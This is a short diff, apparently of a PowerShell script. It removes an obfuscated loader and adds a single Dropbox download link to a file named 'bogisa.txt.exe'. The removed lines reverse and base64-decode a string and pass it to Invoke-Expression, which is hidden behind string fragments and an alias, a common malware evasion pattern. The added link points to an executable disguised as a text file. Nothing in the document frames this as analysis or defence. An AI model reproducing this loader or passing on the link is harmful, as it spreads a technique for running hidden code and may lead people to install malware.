@@ -1,5 +1,1 @@
-$xTdMlX = "" ;
-$TdlMyhWLNtQfBxV2FwRgC = $xTdMlX.ToCharArray() ; [array]::Reverse($TdlMyhWLNtQfBxV2FwRgC) ; -join $TdlMyhWLNtQfBxV2FwRgC 2>&1> $null ;
-$s5g41oJtdarMSyukGVziKWT = [SyStEM.tExt.enCODiNg]::Utf8.getStrINg([SYSTEm.ConvErT]::FROmBase64strINg("$TdlMyhWLNtQfBxV2FwRgC")) ;
-$wvjGuTcy = "InV"+"Oke"+"-Ex"+"pRE"+"SsI"+"ON" ; NEW-aLIAS -NamE pwN -VaLue $wvjGuTcy -fORce ; PwN $s5g41oJtdarMSyukGVziKWT ;
-
+https://www.dropbox.com/scl/fi/127o5f9mmwrsr23buy2km/bogisa.txt.exe?rlkey=9t54h9a8kzw8ej2z6frv1twcl&dl=1
